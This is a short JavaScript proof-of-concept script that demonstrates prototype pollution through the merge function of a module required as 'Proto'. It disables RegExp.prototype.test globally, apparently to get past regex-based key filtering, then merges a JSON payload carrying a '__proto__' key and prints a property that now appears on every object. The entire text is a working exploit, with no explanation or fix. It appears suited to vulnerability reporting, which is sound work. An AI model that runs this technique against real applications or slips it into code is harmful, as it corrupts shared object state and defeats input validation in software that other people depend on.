RegExp.prototype.test = () => false;
const proto = require('Proto');
let payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
proto.merge({}, JSON.parse(payload));
console.log({}.polluted);